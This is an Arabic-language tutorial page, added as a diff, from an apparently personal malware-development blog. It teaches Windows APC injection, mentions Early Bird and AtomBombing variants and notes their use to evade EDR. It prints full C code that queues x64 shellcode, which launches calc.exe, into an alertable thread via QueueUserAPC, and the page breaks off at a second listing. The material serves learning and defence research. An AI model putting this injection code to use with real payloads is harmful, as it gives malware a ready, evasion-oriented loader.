@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APC Injection</title>
+    <link rel="icon" href="../src/Pics/APC-Inj.webp" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
+        crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <style>
+        html,
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow-x: hidden;
+        }
+
+        nav {
+            width: 100%;
+            height: 10vh;
+            position: sticky;
+        }
+
+        .nav-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo span {
+            cursor: pointer;
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hamburg,
+        .cancel {
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            color: gold;
+            display: none;
+            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
+        }
+
+        .nav-container .links {
+            display: flex;
+        }
+
+        .nav-container .links a {
+            font-size: 1.2rem;
+            color: white;
+            margin: 0 20px;
+            text-decoration: none;
+            font-weight: 550;
+            transition: 0.3s linear;
+        }
+
+        .nav-container .links a:hover {
+            color: gold;
+            border-bottom: 2px solid gold;
+        }
+
+        .dropdown {
+            max-height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+            position: absolute;
+            top: 0;
+            transform: translateY(-500px);
+            width: 100%;
+            height: auto;
+            backdrop-filter: blur(4px) brightness(40%);
+            box-shadow: 0 0 20px black;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a {
+            display: flex;
+            color: white;
+            text-decoration: none;
+            padding: 15px 0;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a:hover {
+            background-color: gold;
+            color: black;
+        }
+
+        .dark-mode {
+            background-color: #222;
+            color: #f4f4f4;
+        }
+
+        header {
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            border-bottom: 1px solid gold;
+        }
+
+
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .article h2 {
+            margin-top: 0;
+            border-top: 2px solid gold;
+            border-bottom: 2px solid gold;
+            padding-bottom: 5px;
+        }
+
+        .code-block {
+            background: gold;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+            font-size: 15px;
+        }
+
+
+        @media (max-width:884px) {
+            nav .logo {
+                position: absolute;
+                top: 16px;
+                left: 15px;
+                font-size: 1.5rem;
+            }
+
+            .nav-container .links {
+                display: none;
+            }
+
+            .hamburg,
+            .cancel {
+                display: block;
+            }
+
+        }
+
+
+        @media (max-width:440px) {
+            .nav-container {
+                margin-top: 10px;
+            }
+
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        .footer {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 5px;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: gold;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #51460c;
+
+        }
+
+        .ltr {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .article-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .nav-buttons a {
+            background: gold;
+            color: black;
+            padding: 10px 0;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            text-align: center;
+            flex: 1;
+            margin: 0 10px;
+            max-width: 150px;
+            font-size: 20px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .nav-buttons a:hover {
+            background: #51460c;
+            color: #fff;
+        }
+
+        .download-link {
+            text-decoration: none;
+            color: gold;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .download-link:hover {
+            color: #51460c;
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px auto;
+            text-align: center;
+
+
+        }
+
+        th,
+        td {
+            border: 1px solid black;
+            padding: 7px;
+        }
+
+        th {
+            background-color: gold;
+        }
+    </style>
+</head>
+
+<body>
+    <section>
+        <nav>
+            <div class="nav-container" style="direction: ltr;">
+                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
+                    <span>0x4de1</span>
+                </div>
+                <div class="links">
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
+                            href="https://0x4de1.github.io">Home</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
+                            href="../MalDev.html">Mal Dev</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
+                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
+                </div>
+            </div>
+            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+            <div class="dropdown">
+                <div class="links">
+                    <a href="https://0x4de1.github.io">Home</a>
+                    <a href="../MalDev.html">Mal Dev</a>
+                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
+                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+                </div>
+            </div>
+        </nav>
+        <header>
+            <h1 id="article-title" style="direction: ltr;">APC Injection</h1>
+        </header>
+        <div class="container">
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <img src="../src/Pics/APC-Inj.webp" alt="HomeLab" class="article-image" loading="lazy">
+            </div>
+            <div class="article" data-aos="zoom-in" data-aos-duration="800">
+                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
+                </p>
+                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
+                    مُحَمَّدٍ ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
+                    إِبْرَاهِيمَ ، إِنَّكَ حَمِيدٌ مَجِيدٌ ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ ، كَمَا
+                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ ، إِنَّكَ حَمِيدٌ مَجِيدٌ ، <br>
+                    <br>
+                    ✨🌙 هَلَّ هِلالُ الخَيْرِ ، فَأسألُ اللهَ أنْ يَملأ قُلوبَكم بالنُّورِ واليقينِ ، مُبَارَكٌ
+                    عَلَيكُمُ
+                    الشَّهْرُ 🌙✨
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/Ramadan2.jpg" alt="HomeLab" class="article-image" loading="lazy">
+                </div>
+                </p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <h2>Introduction</h2>
+                <p>[+] فـ المقالتين اللـ فاتوا اتكلمنا عن الـ DLL Injection والـ Shellcode Injection وشوفنا إزاي نقدر نـ
+                    inject شيل كود أو ملف DLL فـ بروسيس ، سواء local أو Remote.</p>
+                <p>[+] المرة دي بقي هنتكلم عن الـ <code style="background: gold; font-size: 14px;">APC Injection</code>
+                    ، ودي طريقة تانية من طرق الـ <code
+                        style="background: gold; font-size: 14px;">Process Injection</code> اللـ
+                    بتعتمد ع
+                    ميكانيزم موجود فـ الويندوز اسمه <code
+                        style="background: gold; font-size: 14px;">Asynchronous Procedure Calls (APCs)</code>.</p>
+                <p style="border-top: 2px solid gold;"></p>
+
+                <p style="font-weight: bold;">[+] طيب يعني إيه APC ؟</p>
+                <p>
+                    قبل مـ نتكلم عن الـ <code style="background: gold; font-size: 14px;">APC Injection</code> ، خلينا
+                    الأول نفهم يعني إيه APC (Asynchronous Procedure Call).
+                </p>
+                <ul>
+                    <li>الويندوز فيه حاجة اسمها <code style="background: gold; font-size: 14px;">APC Queue</code> لكل
+                        Thread ، ودي عبارة عن <code style="background: gold; font-size: 14px;">Queue</code> أو <code
+                            style="background: gold; font-size: 14px;">قائمة انتظار</code> فيها دوال المفروض
+                        الثريد ينفذها فـ وقت معين .. الفكرة هنا إن بعض الدوال فـ الويندوز بتسمح للبرامج إنها تضيف دوال
+                        جديدة للقائمة دي ، بحيث لما الثريد يوصل لحالة معينة ، ينفذ الدوال دي بشكل تلقائي.</li>
+                    <li>بمعنى تاني ، لو عندك ثريد شغال فـ الخلفية ، ومحتاج تنفذ دالة معينة عليه من غير مـ توقفه أو تتدخل
+                        بشكل مباشر ، الويندوز بيسمحلك تضيف الدالة دي فـ الـ <code
+                            style="background: gold; font-size: 14px;">APC Queue</code> الخاصة بالثريد ده ، ولما الثريد
+                        يوصل لحالة معينة ، ينفذها ع طول تلقائي.</li>
+                </ul>
+                <p style="font-weight: bold;">[+] طب إزاي الـ APC Queue بتشتغل؟</p>
+                <p>كل Thread فـ الويندوز عنده <code style="background: gold; font-size: 14px;">APC Queue</code> خاصة بيه
+                    ،
+                    بس الدوال اللـ فيها مش بتتنفذ ع طول ، لازم الثريد يكون
+                    فـ حالة اسمها <code style="background: gold; font-size: 14px;">Alertable State</code> عشان يبدأ ينفذ
+                    الدوال اللـ فـ الـ Queue.</p>
+                <p style="font-weight: bold;">[+] إمتى الثريد بيدخل فـ الـ Alertable State؟</p>
+                <p>فيه دوال معينة فـ الويندوز بتخلي الثريد يدخل الـ Alertable State زي:</p>
+                <ul style="font-weight: bold;direction: ltr;">
+                    <li>SleepEx()</li>
+                    <li>SignalObjectAndWait()</li>
+                    <li>MsgWaitForMultipleObjectsEx()</li>
+                    <li>WaitForMultipleObjectsEx()</li>
+                    <li>WaitForSingleObjectEx()</li>
+                </ul>
+                لما أي ثريد ينفذ واحدة من الدوال دي ، بيبدأ ينفذ أي دوال موجودة فـ <code
+                    style="background: gold; font-size: 14px;">APC Queue</code> الخاصة بيه تلقائيا ..
+                وتقدر تشوف المصدر من <a
+                    href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls"
+                    target="_blank" class="download-link">[هنا]</a>:
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/APCInj-1.png" alt="APC-Injection-1" class="article-image" loading="lazy">
+                </div>
+                <p style="font-weight: bold;">[+] طب إيه علاقة الكلام ده بالـ Injection؟</p>
+                <p>إحنا ممكن نستغل الـ <code style="background: gold; font-size: 14px;">APC Queue</code> عشان نحقن كود
+                    داخل Thread معين ، خصوصا لو الثريد ده فـ الـ Alertable
+                    State
+                    ، والفكرة ببساطة إننا بنضيف Shellcode أو دالة معينة لقائمة الـ <code
+                        style="background: gold; font-size: 14px;">APC Calls</code> الخاصة بالثريد ، ولما ييجي
+                    وقت تنفيذها ، الكود بتاعنا هيشتغل جوه البروسيس اللـ إحنا مستهدفينها.</p>
+
+                <p style="border-top: 2px solid gold;"></p>
+
+                <p style="font-weight: bold;">[+] إزاي ممكن نستخدمه بشكل عملي؟</p>
+                <p>فيه طرق مختلفة لاستغلال الـ <code style="background: gold; font-size: 14px;">APC Injection</code>
+                    عشان ننفذ كود داخل بروسيس تانية ، زي:</p>
+                <ol>
+                    <li style="font-weight: bold;">استخدام QueueUserAPC لتنفيذ دالة داخل ثريد معين :</li>
+                    لو عندنا ثريد فـ حالة الـ Alertable ، ممكن نستخدم <code
+                        style="background: gold; font-size: 14px;">()QueueUserAPC</code> عشان نضيف كود معين يتنفذ فـ
+                    المرة
+                    الجاية اللـ يدخل فيها الثريد الحالة دي .. زي مثلا لو برنامج بيستخدم <code
+                        style="background: gold; font-size: 14px;">()SleepEx</code> بدل <code
+                        style="background: gold; font-size: 14px;">()Sleep</code> ، ممكن
+                    نستغل الموضوع ونضيف <code style="background: gold; font-size: 14px;">APC Call</code> وقت نوم الثريد.
+                    <li style="font-weight: bold;">"Early Bird Injection" – تنفيذ كود قبل نقطة الدخول (Entry Point) :
+                    </li>
+                    هنا بننشئ بروسيس فـ وضع الـ <code style="background: gold; font-size: 14px;">Suspended</code> ،
+                    ونحقن فيه الشيل كود ، وبعدين نستخدم APC Injection عشان نضمن
+                    إنه يتنفذ قبل مـ البروسيس يبدأ شغله الفعلي .. وده أسلوب بيتم استخدامه لتجاوز بعض آليات الحماية زي
+                    الـ EDRs اللـ بتراقب نشاط البروسيس بعد التشغيل.
+                    <li style="font-weight: bold;">استخدام "AtomBombing" لتنفيذ كود خبيث عبر الـ Atom Table :</li>
+                    فـ الطريقة دي الشيل كود بيتكتب فـ الـ <code
+                        style="background: gold; font-size: 14px;">Global Atom Table</code> ، وبعدين بيتنفذ داخل بروسيس
+                    تانية باستخدام
+                    APC Injection.
+                </ol>
+                وتقدر تشوف المصدر من <a href="https://attack.mitre.org/techniques/T1055/004/" target="_blank"
+                    class="download-link">[هنا]</a>.
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/APCInj-2.png" alt="APC-Injection-2" class="article-image" loading="lazy">
+                </div>
+                <p style="border-top: 2px solid gold;"></p>
+
+                <p style="font-weight: bold;">[+] تعالي هقولك شوية أمثلة ع استخدامات الـ APC فـ الويندوز :</p>
+                <ol>
+                    <li style="font-weight: bold;">عمليات الإدخال والإخراج (I/O Operations) :</li>
+                    لما برنامج يطلب يقرأ أو يكتب بيانات من ملف ، أو حتى يحمل حاجة من الإنترنت ، بدل مـ يفضل مستني لحد مـ
+                    العملية تخلص ، الويندوز بيستخدم APC علشان يكمل تشغيل البرنامج عادي ، وأول مـ البيانات تبقى جاهزة ،
+                    الكود يتنفذ تلقائيا .. ومثال ع كده دوال زي <code
+                        style="background: gold; font-size: 14px;">()ReadFileEx</code> و <code
+                        style="background: gold; font-size: 14px;">()WriteFileEx</code> اللـ بتسمح بالقراءة والكتابة
+                    بدون مـ توقف البرنامج.
+                    <li style="font-weight: bold;">تشغيل كود وقت الانتظار باستخدام ()SleepEx :</li>
+                    لو برنامج محتاج ينام شوية باستخدام <code style="background: gold; font-size: 14px;">()SleepEx</code>
+                    بدل <code style="background: gold; font-size: 14px;">()Sleep</code> العادية ، ممكن خلال الوقت ده
+                    يستقبل وينفذ
+                    <code style="background: gold; font-size: 14px;">APC Calls</code> ، وده بيفيد البرامج اللـ مش عايزة
+                    تبقى متوقفة تماما وعايزة تقدر تستجيب لأي حدث يحصل أثناء
+                    النوم.
+                    <li style="font-weight: bold;">انتظار العمليات مع تنفيذ أكواد فـ نفس الوقت WaitForSingleObjectEx :
+                    </li>
+                    أوقات البرامج بتستني يحصل حاجة معينة ، زي مثلا انتهاء تحميل ملف أو استجابة من جهاز خارجي ، باستخدام
+                    <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code> .. فـ الحالة دي ، لو
+                    فـ أي APC Calls متسجلة للثريد ، هتتنفذ تلقائيا وقت
+                    الانتظار بدل مـ يبقى البرنامج واقف تماما.
+                    <li style="font-weight: bold;">تنفيذ كود معين بعد انتهاء Thread معين :</li>
+                    بدل مـ البرنامج يفضل مستني ثريد معين يخلص علشان يبدأ خطوة جديدة ، ممكن يستخدم APC بحيث أول مـ الثريد
+                    يخلص ، يتم تنفيذ كود معين تلقائيا من غير الحاجة لانتظار يدوي أو مراقبة مستمرة.
+                    <li style="font-weight: bold;">تحسين استجابة التطبيقات اللـ فيها واجهة رسومية (GUI Applications) :
+                    </li>
+                    برامج الويندوز اللـ بتعتمد ع واجهة رسومية (زي المتصفحات أو برامج التعديل ع الصور) بتستخدم APC
+                    علشان تعالج الطلبات والرسائل اللـ بتوصل للـ <code
+                        style="background: gold; font-size: 14px;">Message Queue</code> بسرعة وكفاءة ، ودا بيخليها أكتر
+                    سلاسة وأقل
+                    تهنيج.
+                    <li style="font-weight: bold;">التعامل مع الأحداث فـ Kernel Mode :</li>
+                    جوا نظام التشغيل نفسه (<code style="background: gold; font-size: 14px;">Kernel Mode</code>) ،
+                    الويندوز بيستخدم APC علشان يسمح لكود المستخدم (<code
+                        style="background: gold; font-size: 14px;">User Mode</code>) إنه
+                    يتفاعل مع الأحداث اللـ بتحصل فـ الخلفية ، زي استجابة تعريفات الهاردوير أو إدارة الميموري ، وكدا
+                    يعني.
+                    <li style="font-weight: bold;">مساعدة أدوات Debugging ع التحكم فـ البرامج :</li>
+                    أدوات التصحيح (<code style="background: gold; font-size: 14px;">Debugging Tools</code>) بتستخدم APC
+                    علشان تدخل كود معين جوا البرنامج اللـ بيتم تصحيحه ، وده
+                    بيساعد فـ تتبع الأكواد أو تنفيذ بعض العمليات الخاصة بالـ <code
+                        style="background: gold; font-size: 14px;">Hooking & Tracing</code>.
+                </ol>
+                <p>كل السيناريوهات دي بتوضح إن الـ <code style="background: gold; font-size: 14px;">APC Mechanism</code>
+                    مش مجرد حاجة ثانوية ، إنما هو جزء أساسي فـ كيفية تشغيل
+                    التطبيقات فـ الويندوز ، وده السبب اللـ بيخلينا نقدر نستغله فـ الـ <code
+                        style="background: gold; font-size: 14px;">Process Injection</code>.</p>
+                <p style="border-top: 2px solid gold;"></p>
+
+                <p style="font-weight: bold;">[+] بعد المقدمة الطويلة دي واللـ كانت لازم عشان تكون فاهم .. هنتكلم عن:
+                </p>
+                <ol style="font-weight: bold; direction: ltr;">
+                    <li>SleepEx()</li>
+                    <li>WaitForSingleObjectEx()</li>
+                    <li>Suspended Thread</li>
+                    <li>Remote APC Injection (EarlyBird)</li>
+                </ol>
+                <h2 style="direction: ltr;">1. SleepEx()</h2>
+                <p>[+] هنتكلم عن دالتين تبع الـ Windows API ، واللـ هنشوف من خلالهم إزاي نخلي الثريد فـ الـ
+                    <code style="background: gold; font-size: 14px;">Alertable State</code> عشان نقدر ننفذ الـ APC
+                    Injection.
+                </p>
+                <p>الـ <code style="background: gold; font-size: 14px;">()SleepEx</code> دي دالة بتخلي الثريد ينام لفترة
+                    معينة مع إمكانية تنفيذ <code style="background: gold; font-size: 14px;">APC Calls</code> وقت النوم
+                    .. تعالي
+                    ندخل ع الكود والخطوات:</p>
+                <ol>
+                    <li style="font-weight: bold;">هنكريت بروجيكت جديد ونضيف الشيل كود اللـ بنشتغل بيه كل مرة :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/SleepEx-1.png" alt="APC-Injection-3" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">الدالة ()AlertableFunction :</li>
+                    بتستخدم <code style="background: gold; font-size: 14px;">()SleepEx</code> عشان تخلي الثريد
+                    ينام
+                    بس فـ وضع الـ Alertable ، وده معناه إنه يقدر ينفذ أي APC Calls موجودة فـ الـ <code
+                        style="background: gold; font-size: 14px;">APC Queue</code> بتاعته
+                    وقت النوم.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/SleepEx-2.png" alt="APC-Injection-4" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هندخل ع الفانكشن بتاعة الـ Injection :</li>
+                    اتكلمنا عن الـ <code
+                        style="background: gold; font-size: 14px;">VirtualAlloc, memcpy & VirtualProtect</code> قبل كده
+                    .. الجزء الجديد بتاع الـ <code style="background: gold; font-size: 14px;">QueueUserAPC</code>
+                    ..
+                    ودي بتستخدم لإضافة APC للـ APC Queue الخاصة بثريد معين.<br>
+                    لما الثريد المستهدف يدخل فـ وضع الـ Alertable ، الويندوز بيشوف إن فيه APC Call متسجلة فـ الـ APC
+                    Queue ، فينفذ الكود اللـ فـ الـ pAddress ، واللـ فـ حالتنا دي هو Shellcode.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/SleepEx-3.png" alt="APC-Injection-5" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">آخر جزء فانكشن الـ main :</li>
+                    هنا مفيهاش جديد عن اللـ شرحناه قبل كده ، هي بتبدأ التنفيذ بإنشاء Thread جديد باستخدام <code
+                        style="background: gold; font-size: 14px;">CreateThread</code> ،
+                    والثريد ده بيكون فـ الـ <code style="background: gold; font-size: 14px;">Alertable State</code> عشان
+                    يقدر يستقبل APC Calls ، بعد كده بتستدعي
+                    <code style="background: gold; font-size: 14px;">ApcInjectionFunc</code> عشان تحقن الـ Shellcode فـ
+                    الـ Thread اللـ تم إنشاؤه.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/SleepEx-4.png" alt="APC-Injection-6" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/SleepEx-5.png" alt="APC-Injection-7" class="article-image" loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h><br>
+                        #include &lt;stdio.h><br><br>
+                        
+                        unsigned char Payload[] = {<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
+                        
+                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
+                        
+                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
+                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
+                        
+                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                        }<br><br>
+                        
+                        VOID AlertableFunction() {<br>
+                            &nbsp;&nbsp;SleepEx(INFINITE, TRUE);<br>
+                        }<br><br>
+                        
+                        int main() {<br><br>
+                        
+                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, NULL, NULL);<br>
+                            &nbsp;&nbsp;if (hThread == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                        
+                                    &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                </code></div><br>
+                <h2 style="direction: ltr;">2. WaitForSingleObjectEx()</h2>
+                <p>[+] هنتكلم ع طريقة تانية بتخلي الـ Thread فـ Alertable State زي ()SleepEx ، وهي الـ
+                    <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code> .. والفرق إن بدل مـ
+                    الثريد بيكون مجرد نايم ومستني (sleep) ، هنا هو <code
+                        style="background: gold; font-size: 14px;">بيستنى حدث معين (Event) يحصل</code> ، و الثريد مش
+                    بيشتغل لحد
+                    مـ يحصل الحدث ده ، بس لو فـ APC Call متسجلة علية ،
+                    الويندوز هينفذها وقت الانتظار ، وده بيسمح بتنفيذ كود معين فـ نفس التوقيت من غير مـ الثريد يخرج من
+                    حالة الانتظار.
+                </p>
+                <p style="font-weight: bold;">[+] يلا نشوف الكود :</p>
+                <ol>
+                    <li style="font-weight: bold;">فانكشن الـ Alertable :</li>
+                    هنا هنغير الجزء فـ الكود اللـ فات فـ حتة الـ ()SleepEx ، وهنضيف الفانكشن الجديدة.
+                    <ul>
+                        <li>أول حاجة بنستخدم <code style="background: gold; font-size: 14px;">()CreateEvent</code> عشان
+                            ينشئ حدث (Event) ، وده بيكون زي Signal أو إشارة كدا يقدر
+                            الثريد يستناها.</li>
+                        <li>بعد كده <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code>
+                            بتخلي الثريد يستنى الحدث ده لوقت غير محدود (<code
+                                style="background: gold; font-size: 14px;">INFINITE</code>) ، بس
+                            مع
+                            تشغيل <code style="background: gold; font-size: 14px;">Alertable Mode (TRUE)</code> ، وده
+                            معناه إنه لو فـ APC Call متسجلة ع الثريد ، هتتنفذ وقت
+                            الانتظار.</li>
+                        <li>وآخر حتة لما نخلص بنقفل الـ Handle بتاع الحدث باستخدام <code
+                                style="background: gold; font-size: 14px;">CloseHandle(hEvent)</code>.</li>
+                    </ul>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/WaitForSingleObjectEx-1.png" alt="APC-Injection-8" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/WaitForSingleObjectEx-2.png" alt="APC-Injection-9" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h><br>
+                        #include &lt;stdio.h><br><br>
+                        
+                        unsigned char Payload[] = {<br>
